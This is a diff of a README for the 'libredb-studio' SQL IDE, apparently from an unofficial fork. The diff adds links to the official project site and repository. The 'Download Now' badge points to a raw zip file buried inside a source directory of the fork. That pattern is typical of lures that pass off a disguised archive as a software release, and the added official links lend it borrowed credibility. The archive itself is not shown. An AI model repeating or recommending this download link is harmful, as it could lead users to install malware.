@@ -3,6 +3,12 @@
 ## 🔗 Download Now
 [![Download libredb-studio](https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip%20Studio-brightgreen)](https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip)
 
+
+## Reference Project:
+* [https://libredb.org](https://libredb.org)
+* [https://github.com/libredb/libredb-studio](https://github.com/libredb/libredb-studio)
+
+
 ## 🚀 Getting Started
 
 Welcome to libredb-studio! This application is a modern SQL IDE designed for the cloud era. With it, you can query PostgreSQL, MySQL, SQLite, and MongoDB from anywhere. Your browser turns into your very own database studio.
